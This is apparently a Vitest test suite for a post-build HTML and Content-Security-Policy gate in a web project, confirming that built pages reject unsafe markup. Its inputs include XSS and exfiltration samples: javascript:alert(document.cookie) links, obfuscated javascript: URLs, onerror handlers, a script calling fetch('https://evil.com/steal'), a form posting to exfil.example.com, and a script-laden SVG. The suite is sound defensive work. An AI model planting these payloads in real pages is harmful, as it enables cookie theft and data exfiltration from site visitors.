/**
 * Unit and regression tests for the Post-Build HTML and CSP Compatibility Gate (Issue #223).
 *
 * Verifies that the post-build gate and CSS inliner:
 * • Validate final built HTML and static assets in dist/ rather than source templates.
 * • Fail closed on missing, malformed, empty, or invalid inline style policy data.
 * • Reject unapproved inline <style> blocks without any Tailwind marker heuristic fallback.
 * • Fail fatally in `inline-css.js` when no CSS asset exists or the stylesheet link tag is missing.
 * • Reject unapproved script, style, font, image, srcset, form, base, and frame origins.
 * • Reject `javascript:`, `vbscript:`, and executable `data:` URLs (including whitespace-obfuscated forms).
 * • Reject inline `on*` event attributes and `srcdoc` frames.
 * • Reject insecure `http://` mixed content across HTML attributes, srcset, and CSS `url()` / `@import`.
 * • Enforce required security/document metadata (`<!doctype html>`, `<html lang>`, `<meta charset="UTF-8">`, viewport, `<title>`).
 * • Reject duplicate metadata tags and rogue `<meta http-equiv="Content-Security-Policy">` or `refresh` tags.
 * • Enforce exact SHA-256 hashes for inline `<script>` blocks and narrow generated inline `<style>` policy.
 * • Validate Subresource Integrity (`integrity` + `crossorigin`) and JSON-LD structured data.
 */

import { describe, expect, it } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  validateHtml,
  validateBuiltAssets,
  inspectCssContent,
  computeSha256,
  parseCspDirectives,
  isUrlAllowedUnderDirective,
  findHtmlFiles,
  loadGeneratedInlineStyleHashes,
  runPostBuildGate,
} from '../scripts/check-html-csp.ts';
import { inlineCss } from '../scripts/inline-css.js';
import {
  APPROVED_INLINE_SCRIPT_HASHES,
  PAGE_CSP_DIRECTIVES,
} from '../src/utils/security-headers.ts';

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(__dirname, '..');

const SAMPLE_INLINE_CSS = `/*! tailwindcss v4.2.2 | MIT License */
:root { --color-surface: #0e0e0e; }
@layer base { body { margin: 0; } }`;

const SAMPLE_STYLE_HASH = computeSha256(SAMPLE_INLINE_CSS);

const VALID_OPTIONS = {
  approvedScriptHashes: new Set<string>(APPROVED_INLINE_SCRIPT_HASHES),
  approvedStyleHashes: new Set<string>([SAMPLE_STYLE_HASH]),
};

const VALID_SAMPLE_HTML = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Wraith Protocol</title>
    <meta name="description" content="Private payments for every chain." />
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="manifest" href="/site.webmanifest" />
    <link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin />
    <script>
      (function () {
        const nav = window.navigator || {};
        const dnt = nav.doNotTrack || window.doNotTrack;
        const gpc = nav.globalPrivacyControl === true;
        const privacyOptOut = dnt === '1' || dnt === 'yes' || gpc;

        if (privacyOptOut) return;

        window.plausible =
          window.plausible ||
          function () {
            (window.plausible.q = window.plausible.q || []).push(arguments);
          };

        const script = document.createElement('script');
        script.defer = true;
        script.dataset.domain = 'usewraith.xyz';
        script.src = 'https://plausible.io/js/script.scroll.tagged-events.js';
        document.head.appendChild(script);
      })();
    </script>
    <script type="application/ld+json">
      {
        "@context": "https://schema.org",
        "@type": "Organization",
        "name": "Wraith Protocol",
        "url": "https://usewraith.xyz"
      }
    </script>
    <script type="module" crossorigin src="/assets/index.js"></script>
    <style>${SAMPLE_INLINE_CSS}</style>
  </head>
  <body>
    <script>
      (function () {
        const savedTheme = localStorage.getItem('wraith-theme');
        const storedTheme = savedTheme === 'dark' || savedTheme === 'light' ? savedTheme : null;
        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        const theme = storedTheme || (prefersDark ? 'dark' : 'light');
        document.documentElement.setAttribute('data-theme', theme);
        document.documentElement.style.colorScheme = theme;
      })();
    </script>
    <div id="root">
      <h1>Wraith Protocol</h1>
      <img src="/logo.png" srcset="/logo.png 1x, https://usewraith.xyz/logo@2x.png 2x" alt="Wraith Logo" />
      <a href="/about">About</a>
    </div>
  </body>
</html>`;

describe('Post-Build HTML and CSP Compatibility Gate', () => {
  describe('Final build output & compliant HTML acceptance', () => {
    it('accepts compliant HTML matching exact script and generated style SHA-256 hashes', () => {
      const result = validateHtml(VALID_SAMPLE_HTML, 'index.html', VALID_OPTIONS);
      expect(result.ok, JSON.stringify(result.violations)).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.inlineScriptHashes).toEqual([...APPROVED_INLINE_SCRIPT_HASHES]);
      expect(result.inlineStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
    });

    it('validates every built HTML file and static asset in dist/ fail-closed when present', () => {
      const distDir = join(repoRoot, 'dist');
      if (existsSync(distDir)) {
        const htmlFiles = findHtmlFiles(distDir);
        expect(htmlFiles.length).toBeGreaterThan(0);

        const generatedStyleHashes = loadGeneratedInlineStyleHashes();
        expect(generatedStyleHashes.size).toBeGreaterThan(0);

        const gateResult = runPostBuildGate({ distDir });
        expect(gateResult.ok, JSON.stringify(gateResult.violations)).toBe(true);
        expect(gateResult.violations).toEqual([]);
        expect(gateResult.assetViolations).toEqual([]);
      }
    });
  });

  describe('Fail-closed inline style policy & CSS inliner enforcement', () => {
    it('rejects Tailwind-like inline styles when no approvedStyleHashes are supplied (no heuristic fallback)', () => {
      const omittedResult = validateHtml(VALID_SAMPLE_HTML, 'index.html');
      expect(omittedResult.ok).toBe(false);
      expect(omittedResult.violations.some((v) => v.type === 'unapproved-inline-style')).toBe(true);

      const emptySetResult = validateHtml(VALID_SAMPLE_HTML, 'index.html', {
        approvedScriptHashes: VALID_OPTIONS.approvedScriptHashes,
        approvedStyleHashes: new Set<string>(),
      });
      expect(emptySetResult.ok).toBe(false);
      expect(emptySetResult.violations.some((v) => v.type === 'unapproved-inline-style')).toBe(
        true,
      );
    });

    it('fails fatally when generated inline style policy file is missing (unit + production CLI)', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-csp-missing-policy-'));
      try {
        const distDir = join(tmp, 'dist');
        mkdirSync(distDir, { recursive: true });
        writeFileSync(join(distDir, 'index.html'), VALID_SAMPLE_HTML, 'utf8');
        const missingPolicyPath = join(tmp, 'missing-policy.json');

        expect(() => loadGeneratedInlineStyleHashes(missingPolicyPath)).toThrow(/Missing/i);
        expect(() => runPostBuildGate({ distDir, inlinePolicyPath: missingPolicyPath })).toThrow(
          /Missing/i,
        );

        const cli = spawnSync(
          process.execPath,
          [
            '--import',
            'tsx',
            join(repoRoot, 'scripts', 'check-html-csp.ts'),
            '--dist',
            distDir,
            '--policy',
            missingPolicyPath,
          ],
          { cwd: repoRoot, encoding: 'utf8' },
        );
        expect(cli.status).toBe(1);
        expect(cli.stderr).toMatch(/Missing generated inline style policy file/);
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });

    it('fails fatally when generated inline style policy data is malformed, empty, or contains invalid entries', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-csp-invalid-policy-'));
      try {
        const distDir = join(tmp, 'dist');
        mkdirSync(distDir, { recursive: true });
        writeFileSync(join(distDir, 'index.html'), VALID_SAMPLE_HTML, 'utf8');

        const cases = [
          { name: 'malformed JSON', content: '{not-valid-json' },
          {
            name: 'empty array',
            content: JSON.stringify({ sourceAsset: 'assets/a.css', inlineStyleHashes: [] }),
          },
          {
            name: 'missing sourceAsset',
            content: JSON.stringify({ inlineStyleHashes: [SAMPLE_STYLE_HASH] }),
          },
          {
            name: 'non-array inlineStyleHashes',
            content: JSON.stringify({
              sourceAsset: 'assets/a.css',
              inlineStyleHashes: SAMPLE_STYLE_HASH,
            }),
          },
          {
            name: 'mixed valid and invalid hash entries',
            content: JSON.stringify({
              sourceAsset: 'assets/a.css',
              inlineStyleHashes: [SAMPLE_STYLE_HASH, 'not-a-hash'],
            }),
          },
        ];

        for (const testCase of cases) {
          const policyPath = join(tmp, `${testCase.name.replace(/\s+/g, '-')}.json`);
          writeFileSync(policyPath, testCase.content, 'utf8');

          expect(() => loadGeneratedInlineStyleHashes(policyPath), testCase.name).toThrow();
          expect(
            () => runPostBuildGate({ distDir, inlinePolicyPath: policyPath }),
            testCase.name,
          ).toThrow();
        }
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });

    it('fails fatally in inlineCss and CLI when stylesheet link tag is missing and clears stale policy', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-missing-link-'));
      try {
        const distDir = join(tmp, 'dist');
        const assetsDir = join(distDir, 'assets');
        mkdirSync(assetsDir, { recursive: true });
        writeFileSync(
          join(distDir, 'index.html'),
          '<!doctype html><html><head></head></html>',
          'utf8',
        );
        writeFileSync(join(assetsDir, 'index-test123.css'), SAMPLE_INLINE_CSS, 'utf8');

        const policyPath = join(tmp, 'csp-inline-policy.json');
        writeFileSync(
          policyPath,
          JSON.stringify({
            sourceAsset: 'assets/stale.css',
            inlineStyleHashes: [SAMPLE_STYLE_HASH],
          }),
          'utf8',
        );

        expect(() => inlineCss({ distDir, inlinePolicyPath: policyPath })).toThrow(
          /could not find stylesheet <link> tag/,
        );
        expect(existsSync(policyPath)).toBe(false);

        const cli = spawnSync(
          process.execPath,
          [join(repoRoot, 'scripts', 'inline-css.js'), '--dist', distDir, '--policy', policyPath],
          { cwd: repoRoot, encoding: 'utf8' },
        );
        expect(cli.status).toBe(1);
        expect(cli.stderr).toMatch(/could not find stylesheet <link> tag/);
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });

    it('fails fatally in inlineCss when no CSS asset exists in dist/assets', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-no-asset-'));
      try {
        const distDir = join(tmp, 'dist');
        mkdirSync(join(distDir, 'assets'), { recursive: true });
        writeFileSync(
          join(distDir, 'index.html'),
          '<!doctype html><html><head></head></html>',
          'utf8',
        );
        const policyPath = join(tmp, 'csp-inline-policy.json');

        expect(() => inlineCss({ distDir, inlinePolicyPath: policyPath })).toThrow(
          /No CSS asset found to inline/,
        );
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });

    it('inlines CSS end-to-end, writes strict policy, deletes CSS asset, and passes runPostBuildGate', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-e2e-'));
      try {
        const distDir = join(tmp, 'dist');
        const assetsDir = join(distDir, 'assets');
        mkdirSync(assetsDir, { recursive: true });

        const htmlWithStylesheetLink = VALID_SAMPLE_HTML.replace(
          `<style>${SAMPLE_INLINE_CSS}</style>`,
          '<link rel="stylesheet" crossorigin href="/assets/index-test123.css" />',
        );
        writeFileSync(join(distDir, 'index.html'), htmlWithStylesheetLink, 'utf8');
        writeFileSync(join(assetsDir, 'index-test123.css'), SAMPLE_INLINE_CSS, 'utf8');

        const policyPath = join(tmp, 'csp-inline-policy.json');
        const inlineResult = inlineCss({ distDir, inlinePolicyPath: policyPath });

        expect(inlineResult.sourceAsset).toBe('assets/index-test123.css');
        expect(inlineResult.inlineStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
        expect(existsSync(join(assetsDir, 'index-test123.css'))).toBe(false);
        expect(existsSync(policyPath)).toBe(true);

        const gateResult = runPostBuildGate({ distDir, inlinePolicyPath: policyPath });
        expect(gateResult.ok, JSON.stringify(gateResult.violations)).toBe(true);
        expect(gateResult.htmlFilesCount).toBe(1);
        expect(gateResult.uniqueStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
        expect(readFileSync(join(distDir, 'index.html'), 'utf8')).toContain(
          `<style>${SAMPLE_INLINE_CSS}</style>`,
        );
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });
  });

  describe('Unapproved resource origin rejection', () => {
    it('rejects unapproved external script src', () => {
      const html = VALID_SAMPLE_HTML.replace(
        '</head>',
        '<script src="https://evil.com/tracker.js"></script></head>',
      );
      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
      expect(result.ok).toBe(false);
      expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
      expect(result.violations.some((v) => v.message.includes('evil.com'))).toBe(true);
    });

    it('rejects unapproved external stylesheet href', () => {
      const html = VALID_SAMPLE_HTML.replace(
        '</head>',
        '<link rel="stylesheet" href="https://untrusted-cdn.com/styles.css" /></head>',
      );
      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
      expect(result.ok).toBe(false);
      expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
    });

    it('rejects unapproved external font preload origin', () => {
      const html = VALID_SAMPLE_HTML.replace(
        '</head>',
        '<link rel="preload" href="https://untrusted-fonts.com/font.woff2" as="font" /></head>',
      );
      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
      expect(result.ok).toBe(false);
      expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
    });

    it('rejects unapproved external image src and srcset origins', () => {
      const htmlSrc = VALID_SAMPLE_HTML.replace(
        '</body>',
        '<img src="https://unauthorized-cdn.com/banner.png" /></body>',
      );
      expect(validateHtml(htmlSrc, 'index.html', VALID_OPTIONS).ok).toBe(false);

      const htmlSrcset = VALID_SAMPLE_HTML.replace(
        '</body>',
        '<img src="/logo.png" srcset="https://unauthorized-cdn.com/2x.png 2x" /></body>',
      );
      const resSrcset = validateHtml(htmlSrcset, 'index.html', VALID_OPTIONS);
      expect(resSrcset.ok).toBe(false);
      expect(resSrcset.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
    });

    it('rejects unapproved iframe src', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</body>',
            '<iframe src="https://phishing.com"></iframe></body>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).ok,
      ).toBe(false);
    });

    it('rejects unapproved form action and base href origins', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</body>',
            '<form action="https://exfil.example.com/collect"></form></body>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).ok,
      ).toBe(false);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('</head>', '<base href="https://attacker.com/" /></head>'),
          'index.html',
          VALID_OPTIONS,
        ).ok,
      ).toBe(false);
    });

    it('rejects disallowed object and embed elements under object-src none', () => {
      const objRes = validateHtml(
        VALID_SAMPLE_HTML.replace('</body>', '<object data="/app.swf"></object></body>'),
        'index.html',
        VALID_OPTIONS,
      );
      expect(objRes.ok).toBe(false);
      expect(objRes.violations.some((v) => v.type === 'disallowed-element')).toBe(true);
    });

    it('rejects unapproved CSS @import and url() external origins', () => {
      const csp = parseCspDirectives(PAGE_CSP_DIRECTIVES);
      const importViolations = inspectCssContent(
        '@import url("https://evil.example.com/inject.css");',
        'dist/index.html',
        csp,
      );
      expect(importViolations.some((v) => v.type === 'unapproved-origin')).toBe(true);

      const urlViolations = inspectCssContent(
        '.hero { background-image: url("https://tracker.example.com/pixel.gif"); }',
        'dist/index.html',
        csp,
      );
      expect(urlViolations.some((v) => v.type === 'unapproved-origin')).toBe(true);
    });
  });

  describe('Dangerous URLs and mixed content rejection', () => {
    it('rejects javascript:, whitespace-obfuscated javascript:, vbscript:, and data:text/html URLs', () => {
      for (const payload of [
        '<a href="javascript:alert(document.cookie)">Click</a>',
        '<a href="java\nscript:alert(1)">Obfuscated</a>',
        '<iframe src="vbscript:msgbox(1)"></iframe>',
        '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      ]) {
        const html = VALID_SAMPLE_HTML.replace('</body>', `${payload}</body>`);
        const result = validateHtml(html, 'index.html', VALID_OPTIONS);
        expect(result.ok).toBe(false);
        expect(result.violations.some((v) => v.type === 'javascript-url')).toBe(true);
      }
    });

    it('rejects mixed content http:// URLs in HTML attributes, srcset, and CSS', () => {
      const htmlImg = VALID_SAMPLE_HTML.replace(
        '</body>',
        '<img src="http://usewraith.xyz/logo.png" /></body>',
      );
      expect(
        validateHtml(htmlImg, 'index.html', VALID_OPTIONS).violations.some(
          (v) => v.type === 'mixed-content',
        ),
      ).toBe(true);

      const htmlSrcset = VALID_SAMPLE_HTML.replace(
        '</body>',
        '<img src="/logo.png" srcset="http://usewraith.xyz/logo@2x.png 2x" /></body>',
      );
      expect(
        validateHtml(htmlSrcset, 'index.html', VALID_OPTIONS).violations.some(
          (v) => v.type === 'mixed-content',
        ),
      ).toBe(true);

      const htmlInlineStyle = VALID_SAMPLE_HTML.replace(
        '</body>',
        '<div style="background: url(http://usewraith.xyz/bg.png)"></div></body>',
      );
      expect(
        validateHtml(htmlInlineStyle, 'index.html', VALID_OPTIONS).violations.some(
          (v) => v.type === 'mixed-content',
        ),
      ).toBe(true);
    });
  });

  describe('Inline event handlers and srcdoc rejection', () => {
    it('rejects onclick attribute on interactive elements', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('</body>', '<button onclick="doAction()">Run</button></body>'),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'inline-event-handler'),
      ).toBe(true);
    });

    it('rejects onerror attribute on img elements', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('</body>', '<img src="/a.png" onerror="alert(1)" /></body>'),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'inline-event-handler'),
      ).toBe(true);
    });

    it('rejects onload attribute on body and inline srcdoc on iframe', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('<body>', '<body onload="init()">'),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'inline-event-handler'),
      ).toBe(true);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</body>',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe></body>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'unapproved-inline-script'),
      ).toBe(true);
    });
  });

  describe('Critical security metadata, duplicate detection, and HTML/SRI integrity', () => {
    it('rejects missing <meta charset="UTF-8">', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('<meta charset="UTF-8" />', ''),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('charset')),
      ).toBe(true);
    });

    it('rejects non-UTF-8 charset metadata', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('charset="UTF-8"', 'charset="ISO-8859-1"'),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('UTF-8')),
      ).toBe(true);
    });

    it('rejects missing viewport, missing html lang, or missing doctype', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '<meta name="viewport" content="width=device-width, initial-scale=1.0" />',
            '',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('viewport')),
      ).toBe(true);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('<html lang="en">', '<html>'),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('lang')),
      ).toBe(true);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace('<!doctype html>', ''),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'malformed-html'),
      ).toBe(true);
    });

    it('rejects duplicate <title> tags', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '<title>Wraith Protocol</title>',
            '<title>Wraith Protocol</title><title>Second</title>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'duplicate-metadata'),
      ).toBe(true);
    });

    it('rejects duplicate <meta name="description"> tags', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            '<meta name="description" content="Second" /></head>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'duplicate-metadata'),
      ).toBe(true);
    });

    it('rejects duplicate <link rel="canonical"> links', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            '<link rel="canonical" href="https://usewraith.xyz" /><link rel="canonical" href="https://usewraith.xyz/about" /></head>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'duplicate-metadata'),
      ).toBe(true);
    });

    it('rejects rogue meta CSP overrides and meta refresh redirects', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            '<meta http-equiv="Content-Security-Policy" content="default-src *" /></head>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'integrity-violation'),
      ).toBe(true);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            '<meta http-equiv="refresh" content="0;url=https://evil.com" /></head>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'disallowed-element'),
      ).toBe(true);
    });

    it('rejects malformed SRI hashes or external SRI tags missing crossorigin', () => {
      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            '<script src="https://plausible.io/js/script.js" integrity="md5-weak"></script></head>',
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some((v) => v.type === 'integrity-violation'),
      ).toBe(true);

      expect(
        validateHtml(
          VALID_SAMPLE_HTML.replace(
            '</head>',
            `<script src="https://plausible.io/js/script.js" integrity="${SAMPLE_STYLE_HASH}"></script></head>`,
          ),
          'index.html',
          VALID_OPTIONS,
        ).violations.some(
          (v) => v.type === 'integrity-violation' && v.message.includes('crossorigin'),
        ),
      ).toBe(true);
    });
  });

  describe('Exact inline script & generated style hash enforcement', () => {
    it('rejects tampered inline scripts even if they contain plausible/theme keywords (no substring bypass)', () => {
      const spoofedScript = `<script>
        /* plausible.io dataset.domain globalPrivacyControl doNotTrack */
        fetch('https://evil.com/steal');
      </script>`;
      const html = VALID_SAMPLE_HTML.replace('</body>', `${spoofedScript}</body>`);
      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
      expect(result.ok).toBe(false);
      expect(result.violations.some((v) => v.type === 'unapproved-inline-script')).toBe(true);
    });

    it('rejects inline styles whose SHA-256 hash is not in the narrow generated style policy', () => {
      const result = validateHtml(VALID_SAMPLE_HTML, 'index.html', {
        approvedStyleHashes: new Set([computeSha256('body { color: white; }')]),
      });
      expect(result.ok).toBe(false);
      expect(result.violations.some((v) => v.type === 'unapproved-inline-style')).toBe(true);
    });

    it('rejects malformed JSON-LD structured data blocks', () => {
      const html = VALID_SAMPLE_HTML.replace(
        '<script type="application/ld+json">',
        '<script type="application/ld+json">{ broken json </script><script type="application/ld+json">',
      );
      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
      expect(result.ok).toBe(false);
      expect(
        result.violations.some(
          (v) => v.type === 'unapproved-inline-script' && v.message.includes('JSON-LD'),
        ),
      ).toBe(true);
    });
  });

  describe('Built static asset scanning (SVG & CSS)', () => {
    it('flags embedded <script> or inline event attributes inside built SVG assets', () => {
      const tmp = mkdtempSync(join(tmpdir(), 'wraith-csp-assets-'));
      try {
        mkdirSync(join(tmp, 'logos'), { recursive: true });
        writeFileSync(
          join(tmp, 'logos', 'trojan.svg'),
          '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>',
        );
        const violations = validateBuiltAssets(tmp);
        expect(violations.some((v) => v.type === 'unapproved-inline-script')).toBe(true);
        expect(violations.some((v) => v.type === 'inline-event-handler')).toBe(true);
      } finally {
        rmSync(tmp, { recursive: true, force: true });
      }
    });
  });

  describe('CSP policy helper checks', () => {
    it('parses PAGE_CSP_DIRECTIVES and enforces directive fallback rules', () => {
      const parsed = parseCspDirectives(PAGE_CSP_DIRECTIVES);
      expect(parsed.scriptSrc.has("'self'")).toBe(true);
      expect(parsed.scriptSrc.has('https://plausible.io')).toBe(true);
      expect(parsed.styleSrc.has("'self'")).toBe(true);
      expect(parsed.imgSrc.has('https://usewraith.xyz')).toBe(true);
      expect(parsed.connectSrc.has('https://soroban-rpc.stellar.org')).toBe(true);

      const sources = new Set(["'self'", 'https://plausible.io', 'data:']);
      const fallback = new Set(["'self'"]);
      expect(isUrlAllowedUnderDirective('/local.js', sources, fallback).allowed).toBe(true);
      expect(
        isUrlAllowedUnderDirective('https://usewraith.xyz/local.js', sources, fallback).allowed,
      ).toBe(true);
      expect(
        isUrlAllowedUnderDirective('https://plausible.io/js/script.js', sources, fallback).allowed,
      ).toBe(true);
      expect(
        isUrlAllowedUnderDirective('http://usewraith.xyz/x.js', sources, fallback).allowed,
      ).toBe(false);
      expect(
        isUrlAllowedUnderDirective('//plausible.io/js/script.js', sources, fallback).allowed,
      ).toBe(false);
    });
  });
});
